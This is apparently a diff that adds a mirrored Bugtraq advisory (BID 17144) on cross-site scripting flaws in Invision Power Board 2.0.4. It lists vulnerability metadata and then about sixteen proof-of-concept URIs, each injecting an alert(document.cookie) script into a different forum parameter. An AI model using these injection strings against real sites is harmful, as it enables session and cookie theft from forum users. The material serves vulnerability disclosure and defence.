@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid17144<p><b><span style="font-size: 18pt;">Invision Power Board Multiple Cross-Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/17144/info">info</a><br><a href="http://www.securityfocus.com/bid/17144/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/17144/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/17144/solution">solution</a><br><a href="http://www.securityfocus.com/bid/17144/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				17144
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 17 2006 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 20 2006 08:24PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Mr.SNAKE is credited with the discovery of these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Invision Power Services Invision Board 2.0.4 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	This issue can be exploited through a web client.<br/><br/>The following proof-of-concept URIs are available:<br/>http://www.example.com/forum/index.php?act=Search&amp;nav=au&amp;CODE=show&amp;searchid=5f25843edb0242889889796819a2b367&amp;search_in=ooo&amp;result_type='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/forum/index.php?act=Search&amp;nav=au&amp;CODE=show&amp;searchid=5f25843edb0242889889796819a2b367&amp;search_in='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;result_type=posts<br/>http://www.example.com/forum/index.php?act=Search&amp;nav='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/forum/index.php?showtopic=1&amp;st='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/forum/index.php?s=504b8a357b04e1b276f08a039955177f&amp;act=Search&amp;nav=au&amp;CODE=show&amp;searchid=5f25843edb0242889889796819a2b367&amp;search_in='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;http://www.example.com/forum/index.php?s=21355e75e21dcc4c04e24c5c7247b220&amp;act=Search&amp;CODE=01&amp;forums='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/forum/index.php?s='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;act=Search&amp;CODE=01&amp;forums=all<br/>http://www.example.com/forum/index.php?act=calendar&amp;code=birthdays&amp;y=any year&amp;m='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;d=any day<br/>http://www.example.com/forum/index.php?act=calendar&amp;code=birthdays&amp;y='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;m=any month&amp;d=any day<br/>http://www.example.com/forum/index.php?act=calendar&amp;code=birthdays&amp;y=any year&amp;m=any month&amp;d='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/forum/index.php?act=Print&amp;client=printer&amp;f=1&amp;t='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/forum/index.php?act=Mail&amp;CODE=00&amp;MID='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/forum/index.php?act=Help&amp;CODE=01&amp;HID='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/forum/index.php?act=search&amp;CODE=getnew&amp;active='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;lastdate=1<br/>http://www.example.com/forum/index.php?act=Members&amp;max_results=10&amp;sort_key=posts&amp;sort_order='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/forum/index.php?act=Members&amp;max_results='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;sort_key=posts&amp;sort_order=desc<br/>http://www.example.com/forum/index.php?act=Members&amp;max_results=10&amp;sort_key='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;sort_order=desc&amp;sort_order=desc
+	
+		<ul>
+</ul>
+</div>
